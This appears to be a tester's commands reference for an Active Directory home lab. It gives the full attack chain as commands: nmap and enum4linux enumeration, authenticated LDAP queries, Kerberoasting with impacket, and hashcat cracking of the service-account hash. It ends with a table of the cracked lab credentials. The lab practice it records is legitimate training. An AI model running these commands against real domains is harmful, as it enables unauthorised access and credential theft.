# Commands Reference — LAB-AD-001
**Session:** 2026-06-01 | **Tester:** BrndnSmo

---

## Phase 1 — Host Discovery

```bash
# Confirm attacker IP
ip a

# Ping sweep — all live hosts on VLAN 40
nmap -sn 10.10.40.0/24
```

**Hosts Found:**
- 10.10.40.1 — OPNsense Gateway
- 10.10.40.10 — LAB-DC01
- 10.10.40.20 — LAB-WS01
- 10.10.40.125 — Wazuh SIEM
- 10.10.40.60 — Kali (Attacker)

---

## Phase 2 — Service Enumeration

```bash
# Full scan of workstation
nmap -sV -sC -A 10.10.40.20

# Full scan of domain controller
nmap -sV -sC -A 10.10.40.10
```

---

## Phase 3 — SMB Enumeration

```bash
enum4linux -a 10.10.40.20
```

---

## Phase 4 — LDAP Enumeration

```bash
# Anonymous (blocked)
ldapsearch -x -H ldap://10.10.40.10 -b "DC=lab,DC=local" -s sub "(objectclass=user)" | grep sAMAccountName

# Authenticated
ldapsearch -x -H ldap://10.10.40.10 -b "DC=lab,DC=local" -D "LAB\jdoe" -w 'Password123!' -s sub "(objectclass=user)" | grep sAMAccountName
```

---

## Phase 5 — Kerberoasting

```bash
# Fix clock skew (required for Kerberos)
sudo timedatectl set-ntp false
sudo apt install ntpsec-ntpdate
sudo ntpdate 10.10.40.10

# Extract TGS hash
impacket-GetUserSPNs lab.local/jdoe:'Password123!' -dc-ip 10.10.40.10 -request

# Save hash to file
impacket-GetUserSPNs lab.local/jdoe:'Password123!' -dc-ip 10.10.40.10 -request -outputfile sqlservice.hash
```

---

## Phase 6 — Password Cracking

```bash
# Unzip wordlist
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack Kerberos TGS hash
hashcat -m 13100 sqlservice.hash /usr/share/wordlists/rockyou.txt --force
```

**Result:** Cracked in 9 seconds

---

## Credentials Obtained

| Account | Password | Privilege |
|---|---|---|
| jdoe | Password123! | Standard Domain User |
| SQLService | MYpassword123# | Group Policy Creator Owners |
